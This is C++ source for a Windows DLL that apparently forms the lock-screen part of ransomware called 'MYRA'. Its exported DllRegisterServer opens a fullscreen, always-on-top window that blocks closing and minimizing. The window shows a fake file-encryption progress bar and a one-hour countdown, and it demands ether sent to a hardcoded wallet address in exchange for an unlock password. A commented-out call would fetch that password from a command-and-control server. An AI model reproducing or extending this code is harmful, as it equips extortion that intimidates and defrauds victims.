// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>
#include <commctrl.h> // Required for Progress Bar
#include "c2client.h"

#pragma comment(lib, "comctl32.lib") // Ensure linking of common controls

// Global Variables
HBRUSH hbrBkgnd;
HWND hWndInput;
HWND hWndLabels[8];
HWND hWndProgressBar;
HWND hWndTimerLabel;
HWND hwndMain;
HFONT hFontBold;
HWND hWndEncryptionStatusLabel; // Nouveau label de statut de chiffrement
std::wstring correctPassword;

// Timer variables
int remainingTime = 3600;
UINT_PTR timerID;

// Static text for labels
const wchar_t* labelTexts[8] = {
    L"Hello, it's MYRA .",
    L"Contact your administration for more info on this incident ;)",
    L"Bonjour, c'est MYRA.",
    L"Contactez votre administration pour plus d'informations sur cet incident ;)",
    L"Send ETH to this address : 0x141a7758F57bB2023A90Ed8cE4262F050E882Be9 ",
    L"to receive the password"
};

static bool isRed = true;
int fakeProgress = 0;

void SimulateFakeProgress() {
    static int delayCounter = 0;

    if (fakeProgress >= 100) {
        SetWindowText(hWndEncryptionStatusLabel, L"Chiffrement termin�");
        return;
    }
    if (delayCounter > 0) {
        delayCounter--;
        return; // Pause momentan�e
    }

    int step = rand() % 2; // avance de 0 � 2 %
    if (step == 0) {
        delayCounter = rand() % 25; // pause de 0 � 25 cycles ()
    }
    else {
        fakeProgress += step;
        if (fakeProgress > 100) fakeProgress = 100;
    }

    SendMessage(hWndProgressBar, PBM_SETPOS, fakeProgress, 0);
}


// Keep the window active
void KeepWindowActive()
{
    SetForegroundWindow(hwndMain); // Bring to front
    ShowWindow(hwndMain, SW_SHOW);
}

// Function to update the progress bar
void UpdateProgressBar(){
    int progressValue = (3600 - remainingTime) * 100 / 3600; // Calcul du pourcentage
    //SendMessage(hWndProgressBar, PBM_SETPOS, progressValue, 0);
    isRed = !isRed;
    InvalidateRect(hwndMain, NULL, TRUE);

    // Calcul des heures, minutes et secondes restantes
    int hours = remainingTime / 3600;
    int minutes = (remainingTime % 3600) / 60;
    int seconds = remainingTime % 60;

    wchar_t timerText[64];
    swprintf(timerText, 64, L"Temps restant : %02d:%02d:%02d", hours, minutes, seconds);
    SetWindowText(hWndTimerLabel, timerText);

    if (remainingTime <= 0)
    {
        KillTimer(hwndMain, timerID);
        MessageBox(hwndMain, L"Le temps est �coul� ! Fermeture en cours.", L"Timeout", MB_OK | MB_ICONWARNING);
        ExitProcess(0);
        return;
    }

    remainingTime--;
    KeepWindowActive(); // Garder la fen�tre au premier plan
}

// Timer callback function
void CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
{
    UpdateProgressBar();
}

// Window Procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
    case WM_CLOSE:
        return 0; // Block closing via X button

    case WM_SYSCOMMAND:
        if (wParam == SC_CLOSE || wParam == SC_MINIMIZE)
            return 0; // Block ALT+TAB and Minimize
        break;

    case WM_ERASEBKGND:
    {
        HDC hdc = (HDC)wParam;
        RECT rc;
        GetClientRect(hwnd, &rc);
        FillRect(hdc, &rc, hbrBkgnd);
        return 1;
    }

    case WM_CTLCOLORSTATIC:
    {
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, isRed ? RGB(255, 0, 0) : RGB(255, 255, 255));
        SetBkMode(hdcStatic, TRANSPARENT);
        return (LRESULT)GetStockObject(NULL_BRUSH);
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == 1) // Enter Key Pressed
        {
            wchar_t inputText[256];
            GetWindowText(hWndInput, inputText, 256);

            if (wcscmp(inputText, correctPassword.c_str()) == 0)
            {
                MessageBox(hwnd, L"Access Granted!", L"Success", MB_OK | MB_ICONINFORMATION);
                ExitProcess(0);
            }
            else
            {
                MessageBox(hwnd, L"Incorrect Password. Try Again.", L"Error", MB_OK | MB_ICONERROR);
            }
        }
        break;

    case WM_TIMER:
        if (wParam == 1) {
            UpdateProgressBar(); // compte � rebours
        }
        else if (wParam == 2) {
            SimulateFakeProgress(); // fausse barre de chiffrement
        }
        break;


    case WM_DESTROY:
        KillTimer(hwnd, timerID);
        DeleteObject(hbrBkgnd);
        DeleteObject(hFontBold);
        return 0;
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// Create the GUI
void ShowGUI()
{
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS;
    InitCommonControlsEx(&icex);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    hbrBkgnd = CreateSolidBrush(RGB(0, 0, 0));

    hFontBold = CreateFont(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
        VARIABLE_PITCH, L"Arial");

    const wchar_t CLASS_NAME[] = L"MyDLLWindowClass";
    WNDCLASS wc = { };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)GetStockObject(NULL_BRUSH);
    RegisterClass(&wc);

    hwndMain = CreateWindowEx(WS_EX_TOPMOST, CLASS_NAME, L"My DLL GUI",
        WS_POPUP | WS_VISIBLE, 0, 0, screenWidth, screenHeight,
        NULL, NULL, GetModuleHandle(NULL), NULL);

    if (hwndMain == NULL) return;

    int yOffset = screenHeight / 10;

    for (int i = 0; i < 8; i++)
    {
        hWndLabels[i] = CreateWindow(L"STATIC", labelTexts[i], WS_VISIBLE | WS_CHILD,
            screenWidth / 6, yOffset, screenWidth - 200, 40, hwndMain, NULL, GetModuleHandle(NULL), NULL);
        SendMessage(hWndLabels[i], WM_SETFONT, (WPARAM)hFontBold, TRUE);
        yOffset += 50;
    }

    hWndTimerLabel = CreateWindow(L"STATIC", L"You have one hour", WS_VISIBLE | WS_CHILD | SS_CENTER,
        screenWidth / 2 - 150, yOffset, 300,120, hwndMain, NULL, GetModuleHandle(NULL), NULL);
    SendMessage(hWndTimerLabel, WM_SETFONT, (WPARAM)hFontBold, TRUE);
    yOffset += 75;

    hWndEncryptionStatusLabel = CreateWindow(L"STATIC", L"Chiffrement des fichiers en cours...", WS_VISIBLE | WS_CHILD | SS_CENTER,
        screenWidth / 2 - 200, yOffset, 400, 60, hwndMain, NULL, GetModuleHandle(NULL), NULL);
    SendMessage(hWndEncryptionStatusLabel, WM_SETFONT, (WPARAM)hFontBold, TRUE);
    yOffset += 50;


    hWndProgressBar = CreateWindowEx(0, PROGRESS_CLASS, NULL,
        WS_CHILD | WS_VISIBLE | PBS_SMOOTH,
        screenWidth / 4, yOffset + 25, screenWidth / 2, 30,
        hwndMain, NULL, GetModuleHandle(NULL), NULL);

    SendMessage(hWndProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
    SendMessage(hWndProgressBar, PBM_SETPOS, 0, 0);
    yOffset += 60;

    hWndInput = CreateWindow(L"EDIT", L"", WS_TABSTOP | WS_VISIBLE | WS_CHILD | WS_BORDER | ES_PASSWORD | ES_AUTOHSCROLL,
        screenWidth / 4, yOffset, screenWidth / 2, 40, hwndMain, NULL, GetModuleHandle(NULL), NULL);

    HWND hWndEnter = CreateWindow(L"BUTTON", L"Enter", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
        screenWidth / 2 - 50, yOffset + 50, 100, 50, hwndMain, (HMENU)1, GetModuleHandle(NULL), NULL);

    timerID = SetTimer(hwndMain, 1, 1000, NULL);
    timerID = SetTimer(hwndMain, 2, 200, NULL);

    ShowWindow(hwndMain, SW_SHOW);
    UpdateWindow(hwndMain);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// DLL Functions
extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer() { 

    // getting the password
    //std::string password = C2Client::get_password_from_server();
	std::string password = "password"; // Placeholder for password retrieval
    correctPassword = std::wstring(password.begin(), password.end());



    ShowGUI(); 
    return S_OK; 
}
extern "C" __declspec(dllexport) HRESULT __stdcall DllUnregisterServer() { return S_OK; }
extern "C" __declspec(dllexport) HRESULT __stdcall DllInstall() { return S_OK; }

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { return TRUE; }